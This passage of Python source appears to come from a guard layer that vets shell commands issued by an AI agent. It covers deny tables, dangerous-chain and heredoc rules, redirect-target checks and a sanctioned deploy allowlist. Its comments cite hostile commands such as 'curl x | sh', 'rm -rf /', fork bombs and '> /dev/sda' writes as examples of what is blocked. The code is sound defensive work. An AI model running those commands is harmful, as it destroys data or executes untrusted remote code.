    entry → "deny"; deny wins on conflict within the legacy tables).
    An explicit, valid policy["commands"] entry wins over the legacy
    fold. Invalid verdict strings are ignored (legacy value, if any,
    is retained). Pure function — used by the migration shim and by
    presentation surfaces; enforcement reads the shape directly via
    resolve_family_verdict.
    """
    folded: dict[str, str] = {}
    if not isinstance(policy, dict):
        return folded
    allow = policy.get("allow")
    if isinstance(allow, dict):
        for cmd in allow:
            folded[str(cmd)] = "allow"
    deny = policy.get("deny")
    if isinstance(deny, dict):
        for cmd in deny:
            folded[str(cmd)] = "deny"  # deny overpowers allow
    commands = policy.get("commands")
    if isinstance(commands, dict):
        for cmd, verdict in commands.items():
            if isinstance(verdict, str) and verdict.strip().lower() in _FAMILY_VERDICTS:
                folded[str(cmd)] = verdict.strip().lower()
    return folded



_LINUX_ONLY_COMMANDS: dict[str, str] = {
    "chmod": "File permissions are POSIX-only; no Windows equivalent needed.",
    "chown": "File ownership semantics differ on Windows; use `icacls` if needed.",
    "ln": "Use PowerShell `New-Item -ItemType SymbolicLink`.",
    "ps": "Use PowerShell `Get-Process` or Windows `tasklist`.",
    "kill": "Use PowerShell `Stop-Process` or Windows `taskkill /PID N /F`.",
}
_WINDOWS_ONLY_COMMANDS: dict[str, str] = {
    "where": "Use POSIX `which` or `command -v`.",
    "type": "Use POSIX `cat` (note: bash `type` exists but is the "
    "command-introspection builtin, not file print).",
    "tasklist": "Use POSIX `ps aux` or `pgrep`.",
    "taskkill": "Use POSIX `kill -9 PID` or `pkill name`.",
    "dir": "Use POSIX `ls`.",
    "icacls": "POSIX file permissions use `chmod` / `chown`.",
    "cls": "Use POSIX `clear`.",
    "powershell": "PowerShell is rarely installed on POSIX hosts.",
    "pwsh": "PowerShell Core requires explicit install on POSIX.",
    "cmd": "POSIX uses `sh` / `bash`.",
    "robocopy": "Use POSIX `rsync` or `cp -r`.",
    "xcopy": "Use POSIX `cp -r`.",
}


def _current_os_kind() -> str:
    """Return 'windows', 'linux', 'mac', or 'other'."""
    import sys as _sys

    plat = _sys.platform
    if plat.startswith("win"):
        return "windows"
    if plat.startswith("linux"):
        return "linux"
    if plat == "darwin":
        return "mac"
    return "other"


def _evaluate_os_mismatch(segments: list[str]) -> dict[str, Any] | None:
    """Refuse if any segment uses a command native to the OTHER OS.

    Returns a structured refusal with an actionable suggestion when
    the agent's command can't possibly work on the current platform,
    so the agent doesn't burn a turn on a confusing exit-255 stderr.
    Returns None when the OS is unknown (silent pass — fall through
    to normal policy) or when the command is portable.
    """
    os_kind = _current_os_kind()
    if os_kind == "other":
        return None
    if os_kind == "windows":
        blocklist = _LINUX_ONLY_COMMANDS
        wrong_os = "Linux/Mac"
    else:
        blocklist = _WINDOWS_ONLY_COMMANDS
        wrong_os = "Windows"
    for seg in segments:
        base, _args = _base_command(seg)
        if base in blocklist:
            suggestion = blocklist[base]
            return {
                "allowed": False,
                "reason": (
                    f"`{base}` is a {wrong_os} command and is not "
                    f"available on {os_kind}. {suggestion}"
                ),
                "matched_rule": f"os_mismatch.{os_kind}.{base}",
            }
    return None


# ── #435: sanctioned deploy-launch allowlist (CODE-LEVEL, frozen) ────────────
#
# The ONE governed way an agent launches the deploy gate. This is a frozen
# constant, not runtime config — operators cannot widen it from the dashboard
# and a compromised policy table cannot extend it. Matching is an EXACT
# whitespace-normalized full-command match: the fixed script invocation plus
# at most an optional `--tests` flag and an optional hex ref ([0-9a-f]{6,40})
# after it. Anything else appended — `--public` (operator-typed only, never
# agent-launchable), redirects, extra flags, chain operators — falls through
# to normal policy (default.block).
#
# PRECEDENCE: this check runs AFTER the rank-1 locked-family / rank-2
# dangerous-chain phases, which evaluate the FULL command first (Phases 1-2c
# below). Because the sanctioned pattern can only match a single un-chained
# segment (no `;`/`|`/`&&` can survive the fullmatch), a chained
# `deploy_aidocs_gate.sh; rm -rf /` or `&& curl x | sh` NEVER reaches this
# allowance — the chain phases refuse it first and the fullmatch would fail
# regardless. Defense in depth, both directions.
SANCTIONED_DEPLOY_LAUNCH_PREFIX: str = "bash scripts/deploy_aidocs_gate.sh"

_SANCTIONED_DEPLOY_LAUNCH_RE: re.Pattern[str] = re.compile(
    r"^bash scripts/deploy_aidocs_gate\.sh(?: --tests(?: [0-9a-f]{6,40})?)?$",
)


def _is_sanctioned_deploy_launch(command: str) -> bool:
    """True iff the FULL command is exactly the sanctioned deploy launch.

    Normalization: collapse all whitespace runs to single spaces and fold
    Windows path separators, so `bash  scripts\\deploy_aidocs_gate.sh`
    still matches. No other rewriting — quoting, env prefixes, chains,
    or extra arguments all fail the fullmatch (fail closed).
    """
    normalized = " ".join((command or "").replace("\\", "/").split())
    return bool(_SANCTIONED_DEPLOY_LAUNCH_RE.fullmatch(normalized))


def _deploy_gate_pipe_refusal(command):
    """UNBYPASSABLE across BOTH shell-governance floors: evaluate_bash_policy (the
    native-Bash PreToolUse-hook path) AND evaluate_destructive_floor (the ai_run /
    internal code_runner path that governs the shell even when CC hooks are OFF).
    The deploy gate streams a LIVE verdict (Gate 2b, crown_class, PROMOTED or
    ROLLED_BACK); piping it into tail/head/tee or a pager SQUASHES that into a
    truncated snapshot that hides failures. Intent: run it BACKGROUNDED and
    unredirected so output streams in real-time. AIDOCS_DEPLOY_ALLOW_PIPE only
    silences the deploy SCRIPT's own guard; this refuses at the governed-shell
    layer regardless. Returns a refusal dict or None."""
    import re as _re_dep

    if "deploy_aidocs_gate.sh" in command and _re_dep.search(
        r"deploy_aidocs_gate\.sh.*?(?<!\|)\|(?!\|)", command, _re_dep.DOTALL
    ):
        return {
            "allowed": False,
            "reason": (
                "Deploy gate must not be piped. A pipe into tail/head/tee or a "
                "pager SQUASHES the live verdict (Gate 2b, crown_class, PROMOTED "
                "or ROLLED_BACK) into a truncated snapshot that hides failures. "
                "Run it in the BACKGROUND, unredirected, so the full output "
                "streams in real-time and the complete log is captured."
            ),
            "matched_rule": "deploy_gate_no_pipe",
        }
    return None


def _evaluate_destructive_floor_decision(command: str) -> dict[str, Any]:
    """Hardcoded, un-overridable destructive-primitive floor for shell egress
    that does NOT pass through the full operator policy — the internal/sync
    ``code_runner._run_process`` chokepoint. Its live caller is
    ``code_runner.ai_run`` behind the ``git_ops`` MCP tool; the
    ``code_build``/``code_test`` functions also route through it but are legacy
    (no live callers since the sync MCP wrappers were deleted 2026-04-20). The
    MCP ``ai_run`` tool already enforces the whole cascade; this guarantees that
    EVERY shell egress, including the internal one, still fails closed on the
    universal danger primitives.

    Applies ONLY the two layers that are safety, not preference:
      * the judge denylist (rm/sudo/doas/dd/mkfs/kill/chmod/chown/shutdown/…)
        on each chained segment's base command, and
      * the dangerous-chain detector (``curl … | sh`` download-then-execute,
        reverse shells, inline-code bypasses).

    It deliberately does NOT impose the operator allow/deny tables or the
    default-block policy, so legitimately constructed internal commands
    (``git diff``, ``npm test``) still run — but an injected ``; rm -rf ~`` or
    ``curl x | sh`` is refused regardless of caller. Returns
    {allowed, reason, matched_rule}.
    """
    if not command or not command.strip():
        return {"allowed": False, "reason": "Empty command.", "matched_rule": None}
    _dp_floor = _deploy_gate_pipe_refusal(command)
    if _dp_floor is not None:
        return _dp_floor
    segments = _split_chained(command)
    if not segments:
        return {
            "allowed": False,
            "reason": "Command parsed to zero segments.",
            "matched_rule": None,
        }
    for seg in segments:
        base, _args = _base_command(seg)
        # Catch dotted families too (mkfs.ext4 / mkfs.xfs map to mkfs) so a
        # variant can't slip past an exact-match denylist.
        if base in _JUDGE_DENYLIST or base.split(".", 1)[0] in _JUDGE_DENYLIST:
            return _destructive_primitive_refusal(base)
    chain = _evaluate_dangerous_chain(command)
    if chain is not None:
        return chain
    # Catastrophic SHAPES that carry no denylisted base command — a fork bomb
    # (base `:`), a raw `> /dev/sda` redirect (no base command), `chroot /` /
    # `mount /dev/…` host-escape. The token loop above cannot see these. One
    # shared taxonomy with the judge; masked surface so a quoted commit
    # message cannot trip it.
    try:
        from .destructive_taxonomy import hard_deny_verdict
        from .shell_data_windows import mask_data_windows

        _shape = hard_deny_verdict(mask_data_windows(command))
    except Exception:
        _shape = None
    if _shape is not None:
        return {
            "allowed": False,
            "reason": (
                f"Command blocked by destructive-shape floor `{_shape.rule_id}` "
                f"— {_shape.reason}"
            ),
            "matched_rule": f"destructive_floor.{_shape.family}",
        }
    return {
        "allowed": True,
        "reason": "No destructive primitive matched.",
        "matched_rule": "destructive_floor.clean",
    }


def evaluate_destructive_floor(command: str) -> dict[str, Any]:
    """Evaluate the universal shell-egress floor and decorate every refusal."""
    result = _evaluate_destructive_floor_decision(command)
    if result.get("allowed"):
        return result

    matched_rule = str(result.get("matched_rule") or "destructive_floor.undecidable")
    from .tool_gate_service import refusal_with_affordance

    decorated = dict(result)
    decorated["matched_rule"] = matched_rule
    decorated["reason"] = refusal_with_affordance(
        str(result.get("reason") or "Shell egress refused."),
        matched_rule,
        command,
    )
    return decorated


def _evaluate_bash_policy_decision(
    command: str,
    policy: dict[str, Any],
    user_intent_subcommands: list[str] | None = None,
    *,
    workspace_root: str | None = None,
) -> dict[str, Any]:
    """Evaluate a (possibly chained) bash command against a policy dict.

    Returns dict with keys:
        allowed: bool
        reason: str (human-readable, suitable for tool-decision messages)
        matched_rule: str | None (for audit trail)

    Every segment of a chained command must pass; first-failing segment's
    decision is returned.

    user_intent_subcommands: per-session user-granted base commands (from
    the "psql allowed" / "allow docker" grant-phrase detector in
    claude_hook). Semantics:

    - Trumps the deny-table: an operator who typed "allow psql" overrides
      any accidental `deny.psql[*]` rule. This is the whole point of
      user-intent gates — the user is explicitly authorizing the risk.
    - Trumps default-block: a session grant is equivalent to a transient
      allow-table entry for the turn.
    - NEVER bypasses the dangerous-chain check (Phase 2 below). `curl | sh`
      remains judge-blocked regardless of what the user typed.
    - NEVER bypasses _JUDGE_DENYLIST. Hardcoded destructive primitives
      fail closed at this layer as defense-in-depth; even if the grant
      detector misfires and hands us `rm`, we refuse.
    """
    if not command or not command.strip():
        return {
            "allowed": False,
            "reason": "Empty bash command.",
            "matched_rule": None,
        }

    from .shell_data_windows import mask_data_windows as _mask_surface

    # Split the data-masked surface so an inert-reader heredoc body is
    # blanked and its operators do not shred the command into spurious
    # segments and wrongly deny it. Interpreter heredocs are not masked but
    # Phase 2b refuses them; base commands outside masked windows are intact.
    segments = _split_chained(_mask_surface(command))
    if not segments:
        return {
            "allowed": False,
            "reason": "Bash command parsed to zero segments.",
            "matched_rule": None,
        }

    # Filter user-intent grants through the judge denylist here too, so a
    # compromised upstream detector can't hand us `rm`. Defense in depth.
    grants = _normalize_grants(user_intent_subcommands)


    # Phase 0 — OS mismatch check. Refuse Linux-only commands on Windows
    # and Windows-only commands on Linux/Mac BEFORE spawning a subprocess
    # that will exit 255 with a confusing "not recognized" error. The
    # refusal carries an actionable suggestion (the cross-platform or
    # native-OS equivalent) so the agent doesn't waste a turn discovering
    # the error from stdout. (Diagnosed 2026-04-20: agent ran `tail -50`
    # on Windows, got exit 255, didn't realize tail isn't installed.)
    os_check = _evaluate_os_mismatch(segments)
    if os_check is not None:
        return os_check

    # Phase 1 — deny-table per segment. Operator-explicit denies normally
    # win, BUT a user-intent grant for the same base command overrides:
    # typing "allow psql" means "I know psql is denied by default, run it
    # anyway." The judge denylist below keeps the truly dangerous ones
    # locked regardless.
    for seg in segments:
        base, _args = _base_command(seg)
        if base in grants and base not in _JUDGE_DENYLIST:
            # Grant trumps deny-table for this base command.
            continue
        # Family verdict deny (#18) — commands.<family>="deny" refuses
        # upfront, ranking above the legacy pattern tables.
        if resolve_family_verdict(policy, base) == "deny":
            return {
                "allowed": False,
                "reason": (
                    f"Command `{base}` denied by family policy "
                    f"(commands.{base} = deny)."
                ),
                "matched_rule": f"commands.{base}",
            }
        deny_result = _evaluate_segment_deny(seg, policy)
        if deny_result is not None:
            return deny_result

    # Phase 2 — dangerous-chain check on the FULL command. UNBYPASSABLE.
    # Grants and operator config cannot authorize `curl … | sh`. This is
    # the judge layer at the bash policy tier; the heuristic_judge runs
    # in addition, but this check is the statically-provable safety net.
    chain_result = _evaluate_dangerous_chain(command)
    if chain_result is not None:
        return chain_result

    # Phase 2a — command substitution (#319/#233): narrowed from a blanket
    # $() block to a recursive inner-command check. UNBYPASSABLE like the rest
    # of Phase 2. Benign local readers ($(git rev-parse HEAD)) pass; cat $(rm x)
    # / $(curl ...) / backtick rm stay blocked. ONE shared rule → same verdict
    # on ai_run and the native core-law delegate (empire-doctrine XXII).
    subst_result = _evaluate_command_substitution(command, policy)
    if subst_result is not None:
        return subst_result

    # Phase 2b — heredoc consumer law. UNBYPASSABLE. A heredoc fed to an
    # interpreter / shell / eval / source / awk / writer / undecidable
    # consumer is execution-bearing stdin that cannot be proven inert —
    # refuse it BEFORE spawn. Inert-data heredocs (cat/grep/head/… <<EOF)
    # pass; their body is masked for the matchers. Closes the prior
    # universal-heredoc-masking bypass (an interpreter heredoc body used to
    # be blanked, hiding `rm -rf /` / subprocess / exfil from every matcher).
    from .shell_data_windows import heredoc_fail_closed

    _risky_heredocs = heredoc_fail_closed(command)
    if _risky_heredocs:
        return {
            "allowed": False,
            "reason": (
                "Command blocked by heredoc consumer law — a heredoc feeds "
                f"execution-bearing stdin to `{_risky_heredocs[0]}`. Only "
                "proven inert-data readers (cat/grep/head/…) may take a "
                "heredoc; use a script file or an inspected `-c` form for "
                "interpreter input."
            ),
            "matched_rule": f"heredoc_exec.{_risky_heredocs[0]}",
        }

    # Phase 2c - deploy-gate no-pipe law (shared helper; UNBYPASSABLE).
    _dp2 = _deploy_gate_pipe_refusal(command)
    if _dp2 is not None:
        return _dp2

    # Phase 2c1 — destructive-SHAPE floor. UNBYPASSABLE. Catastrophic shapes
    # that carry NO denylisted base command — a fork bomb (base `:`), a raw
    # `> /dev/sda` block-device write, `chroot /` / `mount /dev/…` host escape.
    # The token/deny/allow passes cannot see these (the base is benign or
    # absent). This is the SAME shared taxonomy the internal destructive floor
    # (evaluate_destructive_floor) applies — wiring it here closes the
    # asymmetry where the ai_run internal floor caught a shape the operator-
    # policy path (native Bash hook) did not (empire-doctrine XXII: one gate).
    # Masked surface so a quoted commit message cannot trip it.
    try:
        from .destructive_taxonomy import hard_deny_verdict as _hard_deny_verdict

        _shape = _hard_deny_verdict(_mask_surface(command))
    except Exception:
        _shape = None
    if _shape is not None:
        return {
            "allowed": False,
            "reason": (
                f"Command blocked by destructive-shape floor `{_shape.rule_id}` "
                f"— {_shape.reason}"
            ),
            "matched_rule": f"destructive_floor.{_shape.family}",
        }

    # Phase 2c2 — redirection-target floor. UNBYPASSABLE. A `>` / `>>`
    # redirect whose TARGET is a rooted path (absolute, drive-letter, `~`, or
    # a device/system path) writes OUTSIDE the workspace — `echo x > /dev/sda`,
    # `: > /etc/passwd`, `1>/etc/hosts`. bash_policy otherwise never inspects
    # redirect targets (they are not chain operators), so an allowlisted base
    # (echo/`:`) would smuggle the write. Fd redirections (`2>&1`, `>&2`) and
    # workspace-relative targets (`pytest > out.txt`) are NOT matched. Masked
    # surface so a quoted `">/dev/sda"` in data cannot trip it.
    _redir = _evaluate_redirect_target(_mask_surface(command))
    if _redir is not None:
        return _redir

    # Phase 2c3 — parse-tree SECOND OPINION (doctrine XXXII guest oracle,
    # #472). A real tree-sitter-bash parse can prove a dangerous STRUCTURE the
    # regex floor missed (a substitution the mask didn't catch, a redirect
    # target it couldn't tokenize). The STRICTER reading wins — this can only
    # ADD a refusal. Parser unavailable / parse error ⇒ get None ⇒ the owned
    # regex floor above stays authoritative (fail-OPEN — never weakens). Runs
    # on the masked surface so a quoted data payload is not parsed as code.
    try:
        from .shell_command_insight import parse_tree_stricter_refusal

        _oracle = parse_tree_stricter_refusal(_mask_surface(command))
    except Exception:
        _oracle = None
    if _oracle is not None:
        return _oracle

    # Phase 2d — sanctioned deploy-launch allowlist (#435; code-level frozen
    # constant). Runs AFTER every unbypassable phase above — rank-1 deny
    # table, rank-2 dangerous chains, command substitution, heredoc law and
    # the no-pipe law all evaluated the FULL command first, so nothing this
    # allows can smuggle a refused construction. Exact full-command match
    # only: `--public` and any other appendage fall through to Phase 3
    # (default.block for an agent session).
    if _is_sanctioned_deploy_launch(command):
        return {
            "allowed": True,
            "reason": (
                "Allowed by sanctioned deploy-launch allowlist "
                f"(`{SANCTIONED_DEPLOY_LAUNCH_PREFIX}`, code-level, #435)."
            ),
            "matched_rule": "sanctioned_launch.deploy_aidocs_gate",
        }

    # Phase 3 — allow-table per segment + default fallthrough. User-intent
    # grants count as a per-turn allow entry.
    #
    # Ask deferral (#472): an ask verdict (family "ask" or default=ask) is
    # NOT returned immediately — later segments are still evaluated so a
    # chain like `unlisted && rm -rf /` returns the HARD refusal of the
    # locked segment, never an operator-clickable ask covering the whole
    # chain. Only when every segment lands allow-or-ask does the first ask
    # surface.
    last_allow: dict[str, Any] | None = None
    pending_ask: dict[str, Any] | None = None
    for seg in segments:
        base, _args = _base_command(seg)
        if base in grants and base not in _JUDGE_DENYLIST:
            last_allow = {
                "allowed": True,
                "reason": f"Allowed by user-intent grant for `{base}`.",
                "matched_rule": f"user_intent.{base}",
            }
            continue
        # Family verdict allow/ask (#18). Runs AFTER the unbypassable
        # phases (denylist, dangerous chains, substitution, heredoc) and
        # BEFORE governed heuristics + legacy allow tables — an explicit
        # family verdict is operator intent and wins over both.
        configured_family_verdict = _configured_family_verdict(policy, base)
        family_verdict = resolve_family_verdict(policy, base)
        locked_family = base in _JUDGE_DENYLIST or base.split(".", 1)[0] in _JUDGE_DENYLIST
        if locked_family:
            # Preserve explicit deny/default-block precedence when no family
            # override tried to weaken the floor. A configured allow/ask is
            # itself the bypass attempt, so report the canonical locked rule.
            if configured_family_verdict in {"allow", "ask"}:
                return _destructive_primitive_refusal(base)
            legacy_locked = _evaluate_segment_allow(seg, policy)
            if not legacy_locked["allowed"] and legacy_locked.get("verdict") != "ask":
                return legacy_locked
            # #472: a locked family must NEVER escalate to ask — under
            # default=ask an unlisted `rm` would otherwise surface an
            # operator-clickable ask for a judge-locked primitive. Pin it
            # to the canonical hard refusal (same as an allow attempt).
            return _destructive_primitive_refusal(base)
        if family_verdict == "allow":
            last_allow = {
                "allowed": True,
                "reason": f"Allowed by family policy (commands.{base} = allow).",
                "matched_rule": f"commands.{base}",
            }
            continue
        if family_verdict == "ask":
            # One-shot escalation: allowed=False + verdict="ask" — the
            # hook layer maps this to permissionDecision=ask. Never
            # added to sticky grants. Deferred (#472): see loop note.
            if pending_ask is None:
                pending_ask = {
                    "allowed": False,
                    "verdict": "ask",
                    "reason": (
                        f"Command `{base}` requires operator confirmation "
                        f"(commands.{base} = ask)."
                    ),
                    "matched_rule": f"commands.{base}",
                }
            continue
        # Governed read-only family — a curated, workspace-bounded class
        # (grep/rg/find/cat/head/tail/git-status-style) is allowed through
        # the governed shell even without an explicit allow rule. Runs
        # AFTER the unbypassable deny-table + dangerous-chain phases, and
        # is_governed_readonly itself refuses writes, network binaries
        # (curl/wget/ssh hard-deny), metacharacters, and out-of-workspace
        # paths — so this never opens egress or a write.
        if workspace_root is not None:
            try:
                from .shell_readonly import is_governed_readonly

                gr_ok, _gr_reason = is_governed_readonly(seg, workspace_root)
            except Exception:
                gr_ok = False
            if gr_ok:
                last_allow = {
                    "allowed": True,
                    "reason": (
                        f"Allowed by governed read-only family (workspace-bounded): `{base}`."
                    ),
                    "matched_rule": f"governed_readonly.{base}",
                }
                continue
            # Governed project-local SCRIPT-FILE execution. `bash ./x.sh` is
            # the same threat class as the already-permitted `python x.py`
            # (repo-owned code, contents uninspected). Runs AFTER the
            # unbypassable deny-table + dangerous-chain phases, so an inline
            # `bash -c '…'`, a trailing `&& rm -rf /`, or a `| sh` segment all
            # stay denied. See shell_local_script for the full refused set.
            try:
                from .shell_local_script import is_governed_local_script

                ls_ok, _ls_reason = is_governed_local_script(seg, workspace_root)
            except Exception:
                ls_ok = False
            if ls_ok:
                last_allow = {
                    "allowed": True,
                    "reason": (
                        f"Allowed by governed project-local script execution: `{base}`."
                    ),
                    "matched_rule": f"local_script.{base}",
                }
                continue
            # Governed parse-only syntax check (#327). `bash -n <local-script>`
            # PARSES the script without EXECUTING it — strictly safer than the
            # execution form above. `-c` / stdin / interactive / out-of-workspace
            # stay refused; the deny-table + dangerous-chain already ran.
            try:
                from .shell_local_script import is_governed_parse_check

                pc_ok, _pc_reason = is_governed_parse_check(seg, workspace_root)
            except Exception:
                pc_ok = False
            if pc_ok:
                last_allow = {
                    "allowed": True,
                    "reason": (
                        f"Allowed by governed parse-only syntax check (workspace-bounded): `{base}`."
                    ),
                    "matched_rule": f"bash_parse_only.{base}",
                }
                continue
            # Governed safe awk text-extraction (#313). awk/gawk/mawk in a
            # provably-safe shape (no exec/pipe/net/write/load/env; -F/-v only;
            # workspace-bounded files). A blacklist can't safely gate a whole
            # language, so this is a POSITIVE shape-check like the parse-only one.
            try:
                from .shell_local_script import is_governed_awk_safe

                awk_ok, _awk_reason = is_governed_awk_safe(seg, workspace_root)
            except Exception:
                awk_ok = False
            if awk_ok:
                last_allow = {
                    "allowed": True,
                    "reason": (
                        f"Allowed by governed safe awk text-extraction (workspace-bounded): `{base}`."
                    ),
                    "matched_rule": f"awk_safe.{base}",
                }
                continue
            # Governed DEV-TOOLCHAIN family (#472). Workspace-bounded,
            # no-network developer commands (pytest / python -m <curated> /
            # ruff / mypy / npm test / npm run / npx --no-install /
            # cargo check|test|fmt|clippy / git SAFE subcommands / make
            # <target>) in a POSITIVE shape-check, mirroring the read-only
            # family above. Runs AFTER every unbypassable phase — deny
            # table, dangerous chains, substitution, heredoc law — so a
            # chained `git status && rm -rf /` or `pytest; curl x | sh`
            # never reaches this allowance. Network subcommands
            # (pip/npm install, cargo install, git push/pull/fetch/clone),
            # inline code (-c/-e), and out-of-workspace paths are refused
            # by the family and fall through to the allow-table/default.
            try:
                from .shell_dev_toolchain import is_governed_dev_toolchain

                dt_ok, _dt_reason = is_governed_dev_toolchain(seg, workspace_root)
            except Exception:
                dt_ok = False
            if dt_ok:
                last_allow = {
                    "allowed": True,
                    "reason": (
                        f"Allowed by governed dev-toolchain family (workspace-bounded): `{base}`."
                    ),
                    "matched_rule": f"dev_toolchain.{base}",
                }
                continue
        result = _evaluate_segment_allow(seg, policy)
        if not result["allowed"]:
            if result.get("verdict") == "ask":
                # default=ask fallthrough — deferred (#472): see loop note.
                if pending_ask is None:
                    pending_ask = result
                continue
            return result
        last_allow = result

    if pending_ask is not None:
        return pending_ask
    return last_allow or {
        "allowed": False,
        "reason": "No segments evaluated.",
        "matched_rule": None,
    }


def evaluate_bash_policy(
    command: str,
    policy: dict[str, Any],
    user_intent_subcommands: list[str] | None = None,
    *,
    workspace_root: str | None = None,
) -> dict[str, Any]:
    """Canonical shell-law boundary with universal refusal metadata."""

    decision = _evaluate_bash_policy_decision(
        command,
        policy,
        user_intent_subcommands,
        workspace_root=workspace_root,
    )
    if decision.get("allowed") or decision.get("verdict") == "ask":
        return decision

    from .tool_gate_service import refusal_with_affordance

    result = dict(decision)
    rule_id = str(result.get("matched_rule") or "bash_policy.undecidable")
    result["matched_rule"] = rule_id
    result["reason"] = refusal_with_affordance(
        str(result.get("reason") or "Shell command refused."),
        rule_id,
        command,
    )
    return result
